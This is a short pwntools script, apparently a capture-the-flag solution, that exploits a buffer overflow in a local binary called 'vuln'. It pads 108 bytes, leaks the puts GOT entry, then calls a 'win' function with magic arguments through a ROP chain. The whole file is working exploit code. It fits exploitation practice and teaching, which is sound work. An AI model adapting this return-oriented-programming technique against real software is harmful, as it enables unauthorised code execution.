from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

rop = ROP(elf)

rop.raw("A" * 108)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['win'], (0xCAFEF00D, 0xF00DF00D))
p = process('./vuln')

p.send(rop.chain())
p.interactive()
